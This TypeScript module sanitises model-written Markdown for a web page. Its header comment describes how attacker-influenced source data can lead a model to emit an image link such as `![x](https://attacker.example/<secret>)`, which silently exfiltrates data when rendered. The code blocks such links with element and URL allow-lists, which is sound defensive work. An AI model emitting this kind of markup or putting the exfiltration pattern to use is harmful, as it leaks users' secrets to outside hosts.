/**
 * What model- or source-written Markdown may become on the Intelligence page (R-027 ONE, Codex
 * round 1, HIGH).
 *
 * An answer's Markdown is written by a model that has read source data, so anything in it is
 * attacker-influenced. `![x](https://attacker.example/<secret>)` rendered as an `<img>` makes the
 * browser fetch that URL the moment the answer is shown: data leaves without anybody clicking or
 * approving anything. So:
 *
 *  - **No resource-loading element exists in the output.** The element allow-list below has no
 *    `img`, `iframe`, `video`, `audio`, `source`, `object`, `embed`, `link`, `style` or `script`.
 *    An image is rendered as inert text naming that it was withheld; raw HTML is skipped.
 *  - **A link's URL must be in-page or same-origin.** `#fragment` (the citation chips) and an
 *    app-relative path (`/provenance?...`). Everything else, including `https:`, `mailto:`,
 *    `javascript:`, `data:` and protocol-relative `//host`, is dropped, and the link text stays
 *    as text.
 *
 * Pure and dependency-free so the `@unit` tests can check it without rendering.
 */

/** The only elements model Markdown may produce. Text, structure and links: nothing that loads. */
export const SAFE_MARKDOWN_ELEMENTS: readonly string[] = [
  "p", "br", "hr", "strong", "em", "del", "code", "pre", "blockquote",
  "ul", "ol", "li", "h1", "h2", "h3", "h4", "h5", "h6",
  "table", "thead", "tbody", "tr", "th", "td", "a",
];

/** Elements that make a browser fetch something when rendered. None may ever be allowed. */
export const RESOURCE_LOADING_ELEMENTS: readonly string[] = [
  "img", "image", "picture", "source", "video", "audio", "track", "iframe", "frame", "object",
  "embed", "link", "style", "script", "svg", "input", "form", "base", "meta",
];

/**
 * The URL a link may carry, or `null` to drop it. In-page fragments and same-origin, app-relative
 * paths only. Control characters and backslashes are refused outright: browsers normalise `/\host`
 * and tab-split schemes into navigations to another origin.
 */
export function safeMarkdownUrl(url: string | null | undefined): string | null {
  if (typeof url !== "string") return null;
  const u = url.trim();
  if (!u || /[\u0000-\u001f\u007f\\]/.test(u)) return null;
  if (u.startsWith("#")) return u;
  if (u.startsWith("/") && !u.startsWith("//")) return u;
  return null;
}
